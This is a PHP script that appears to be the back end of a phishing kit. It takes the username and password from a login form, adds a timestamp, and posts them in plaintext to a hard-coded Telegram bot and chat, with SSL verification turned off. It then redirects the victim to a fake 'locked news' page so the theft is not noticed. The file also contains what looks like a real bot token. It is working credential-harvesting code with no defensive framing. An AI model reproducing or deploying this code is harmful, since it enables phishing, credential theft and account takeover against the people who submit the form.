<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the submitted username and password
    $username = $_POST["login"];
    $password = $_POST["password"];

    // Set the timezone to IST (Indian Standard Time)
    date_default_timezone_set('Asia/Kolkata');

    // Get the current date and time in IST (12-hour format with AM/PM)
    $dateTime = date("Y-m-d h:i:s A");

    // Compose the message with the login credentials and date/time
    $message = "Username: " . $username . "\n" . "Password: " . $password . "\n";
    $message .= "Date/Time (IST): " . $dateTime . "\n\n";

    // Telegram Bot details
    $botToken = '7257814757:AAG5RyBq0M8KGqhuSS_PBK3tvnszTsI7OXg';
    $chatIds = ['1272510733']; // List of chat IDs to send the message to
    
    $messageTitle = "jerrys ✅" ;
    // Send the message via Telegram
    sendTelegramMessage($messageTitle, $message);

    // Redirect the user to the locked news page after successful login
    header("Location: locked/news.html");
    exit();
} else {
    // Redirect the user back to the login page or display an error message
    header("Location: http://error.html");
    exit();
}

// Function to send message via Telegram
function sendTelegramMessage($title, $body) {
    global $botToken, $chatIds;
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $logFile = __DIR__ . '/telegram_log.txt';
    
    foreach ($chatIds as $chatId) {
        $data = [
            'chat_id' => $chatId,
            'text' => "*" . $title . "*\n" . $body,
            'parse_mode' => 'Markdown'
        ];

        $logMessage = date("Y-m-d H:i:s") . " - Attempting to send to chat_id: $chatId\n";

        if (function_exists('curl_init')) {
            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
            $response = curl_exec($ch);
            $error = curl_error($ch);
            curl_close($ch);
            
            $logMessage .= "Method: CURL\nResponse: " . $response . "\nError: " . $error . "\n\n";
        } else {
            $options = [
                'http' => [
                    'method' => 'POST',
                    'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
                    'content' => http_build_query($data),
                    'timeout' => 15,
                    'ignore_errors' => true
                ],
                'ssl' => [
                    'verify_peer' => false,
                    'verify_peer_name' => false
                ]
            ];
            $context = stream_context_create($options);
            $response = @file_get_contents($url, false, $context);
            
            $logMessage .= "Method: file_get_contents\nResponse: " . $response . "\n\n";
        }

        file_put_contents($logFile, $logMessage, FILE_APPEND);
    }
}
?>
